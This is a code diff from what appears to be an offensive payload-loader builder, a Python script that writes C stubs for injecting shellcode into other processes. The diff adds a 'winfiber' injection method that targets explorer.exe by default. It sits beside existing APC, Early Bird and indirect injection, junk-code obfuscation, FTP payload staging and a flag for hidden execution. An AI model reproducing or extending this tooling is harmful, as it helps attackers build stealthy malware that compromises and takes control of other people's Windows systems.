@@ -96,13 +96,14 @@ int {junk_func}() {{
         stub_code = stub_code.replace("{{PATH}}", "")
 
     # Injection method specific replacements
-    if inject_method == "indirect":
+    if inject_method == "apc":
+        stub_code = stub_code.replace("{{INJECT_METHOD_CALL}}", "inject_APC(buf, len);")
+    elif inject_method == "winfiber":
+        target_pid = target_process if target_process else "explorer.exe"
+        stub_code = stub_code.replace("{{INJECT_METHOD_CALL}}", f"inject_WinFiber({target_pid}, buf, len);")
+    elif inject_method == "indirect":
         stub_code = stub_code.replace("{{INJECT_METHOD_CALL}}", "IndirectInject(buf, len);")
         stub_code = "#define USE_INDIRECT\n" + stub_code
-        process_name = target_process if target_process else "notepad.exe"
-        stub_code = stub_code.replace("{{PROCESS}}", process_name)
-    else:
-        stub_code = stub_code.replace("{{INJECT_METHOD_CALL}}", "inject_APC(buf, len);")
 
     os.makedirs("build", exist_ok=True)
     with open("build/stub.c", "w") as f:
@@ -167,7 +168,7 @@ def main():
     parser.add_argument("--ftp-user", default="anonymous", help="FTP username")
     parser.add_argument("--ftp-pass", default="", help="FTP password")
     parser.add_argument("--hide", action="store_true", help="Compile stub with -mwindows for hidden execution")
-    parser.add_argument("--inject", choices=["apc", "indirect"], default="apc", help="Injection method")
+    parser.add_argument("--inject", choices=["apc", "indirect", "winfiber"], default="apc", help="Injection method")
     parser.add_argument("--target-process", help="Target process name for indirect injection (e.g., notepad.exe)")
     parser.add_argument("--early-bird", action="store_true", help="Enable Early Bird APC injection")
     parser.add_argument("--embed", action="store_true", help="Embed payload directly into stub (disable staging)")
